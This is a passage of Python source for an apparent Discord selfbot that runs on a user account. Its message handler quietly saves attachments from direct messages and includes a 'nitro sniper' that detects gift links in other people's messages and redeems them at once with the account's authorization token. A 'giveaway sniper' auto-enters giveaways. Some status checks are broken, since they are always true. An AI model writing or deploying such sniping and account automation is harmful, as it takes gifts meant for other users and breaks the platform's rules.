                em.set_footer(text=footer)
                await ctx.send(embed=em, delete_after=deletetimer)
            r = requests.get("https://nekos.life/api/v2/img/" + text)
            res = r.json()
            em = discord.Embed()
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except KeyError:
            commandprint("KeyError has been triggerd.")

@bot.command(pass_context=True)
async def info(ctx):
    await ctx.message.delete()
    commandprint("Command 'info' has been used by " + bot.user.name)
    try:
        currenttime = time.time()
        difference = int(round(currenttime - start_time))
        text = str(datetime.timedelta(seconds=difference))
        embed=discord.Embed(title=f"**BOT INFORMATION**", description="", color=color, delete_after=deletetimer)
        embed.add_field(name="**VERSION**", value=version, inline=False)
        embed.add_field(name="**UPTIME**", value=text, inline=False)
        embed.add_field(name="**PING**", value=f"{round(ctx.bot.latency * 1000)}ms", inline=False)
        embed.add_field(name="**PREFIX**", value=prefix, inline=False)
        embed.add_field(name="**COMMANDS**", value="" + str(amountofcommands), inline=False)
        embed.add_field(name="**CONFIG**", value=f"{config_name}", inline=False)
        if nitrosniper == "true":
            embed.add_field(name="**NITRO SNIPER**", value="Enabled", inline=False)
        else:
            embed.add_field(name="**NITRO SNIPER**", value="Disabled", inline=False)
        if giveawaysniper == "true":
            embed.add_field(name="**GIVEAWAY SNIPER**", value="Enabled", inline=False)
        else:
            embed.add_field(name="**GIVEAWAY SNIPER**", value="Disabled", inline=False)
        embed.set_footer(icon_url=bot.user.avatar_url, text="Logged in as: " + bot.user.name)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', user not found?".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

download_attachments = "true"

with open('data/blacklisted words/badwords.txt') as bad_words_list:
    bad_words_list = bad_words_list.read().split()

@bot.event
async def on_message(message):
    # download attachments
    if download_attachments == "true":
        guild = message.guild
        if not guild:
            if message.author.id != bot.user.id:
                if message.attachments:
                    await message.attachments[0].save(f'data/attachments/{message.attachments[0].id}-{message.attachments[0].filename}')
                    eventprint(f'Downloaded {message.attachments[0].filename} from: {message.channel}')
    # case deletion
    if message.author.id == bot.user.id:
        for badword in bad_words_list:
            if badword in message.content.lower():
                detection(bot.user.name + " said a prohibited word '" + badword + "' in '" + message.content + "', deleting in 60 seconds.")
                await asyncio.sleep(60)
                await message.delete()
                detection("Message '" + message.content + "' deleted.")
    # NITRO SNIPER
    if nitrosniper == "true":
        try:
            code = re.search(r'(discord.gift|discordapp.com/gifts)/\w{16,24}', message.content).group(0)
            start_time = time.time()

            def returnData(status, code):
                if status == 'INVALID CODE' or 'DENIED':
                    perhaps = Fore.RED
                elif status == 'ALREADY REDEEMED' or 'RATELIMITED' or 'UNKNOWN':
                    perhaps = Fore.YELLOW
                else:
                    perhaps = Fore.GREEN
                delay = (time.time() - start_time)
                sniperprint(Fore.RESET + "[" + perhaps + status + Fore.RESET + "]" + " - " +"[" + Fore.CYAN + code + Fore.RESET + "]" + f" | {message.guild} | {message.author} |" + Fore.RED + " DELAY: " + "%.3fs" % delay)

            errors = {
                    1: '{"message": "Unknown Gift Code", "code": 10038}',
                    2: '{"message": "This gift has been redeemed already.", "code": 50050}',
                    3: 'You are being rate limited',
                    4: 'Access denied'
                }
            payload = {
                    'channel_id': None,
                    'payment_source_id': None
                }
            headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                    'Authorization': nitrosniperredeem
                }

            session = requests.Session()
            r = session.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code.replace("discord.gift/", "")}/redeem', headers=headers, json=payload)
            if errors[1] in r.text:
                returnData('INVALID CODE', code)
                try:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[WARN] Invalid Code {code} | {message.guild} | {message.author}' + '\n')
                except:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[WARN] Invalid Code {code} | {message.guild.id} | {message.author}' + '\n')
            elif errors[2] in r.text:
                returnData('ALREADY REDEEMED', code)
                try:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[INFO] Already redeemed Code {code} | {message.guild} | {message.author}' + '\n')
                except:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[INFO] Already redeemed Code {code} | {message.guild.id} | {message.author}' + '\n')
            elif errors[3] in r.text:
                returnData('RATELIMITED', code)
                open('data/nitro/nitro-logs.txt', 'a+').write(f'[WARN] RateLimited' + '\n')
            elif errors[4] in r.text:
                returnData('DENIED', code)
                open('data/nitro/nitro-logs.txt', 'a+').write(f'[WARN] Denied' + '\n')
            else:
                returnData('CLAIMED', code)
                try:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[SUCCESS] Claimed Code {code} | {message.guild} | {message.author} | {r.text}' + '\n')
                except:
                    open('data/nitro/nitro-logs.txt', 'a+').write(
                        f'[SUCCESS] Claimed Code {code} | {message.guild.id} | {message.author} | {r.text}' + '\n')
        except AttributeError:
            pass
    if giveawaysniper == "true":
        if '**giveaway**' in str(message.content).lower() or ('react with' in str(message.content).lower() and 'giveaway' in str(message.content).lower()):
            try:
                await asyncio.sleep(giveawaysniperdelay)
                await message.add_reaction("🎉")
                sniperprint("Giveaway entered" + Fore.WHITE + " [" + Fore.YELLOW + message.guild.name + Fore.WHITE + " | " + Fore.YELLOW + message.channel.name + Fore.WHITE + "]" + Fore.RESET)
            except:
                sniperprint("Failed to enter Giveaway" + Fore.WHITE + " [" + Fore.YELLOW + message.guild.name + Fore.WHITE + " | " + Fore.YELLOW + message.channel.name + Fore.WHITE + "]" + Fore.RESET)
        elif '<@' + str(bot.user.id) + '>' in message.content and ('giveaway' in str(message.content).lower() or 'won' in message.content or 'winner' in str(
            message.content).lower()):
            try:
                won = re.search("You won the \*\*(.*)\*\*", message.content).group(1)
            except:
                won = "UNKNOWN"
            sniperprint("Congratulations! You won a Giveaway: " + Fore.LIGHTCYAN_EX + won + Fore.WHITE + " [" + Fore.YELLOW + message.guild.name + Fore.WHITE + " | " + Fore.YELLOW + message.channel.name + Fore.WHITE + "]" + Fore.RESET)
    await bot.process_commands(message)

login()
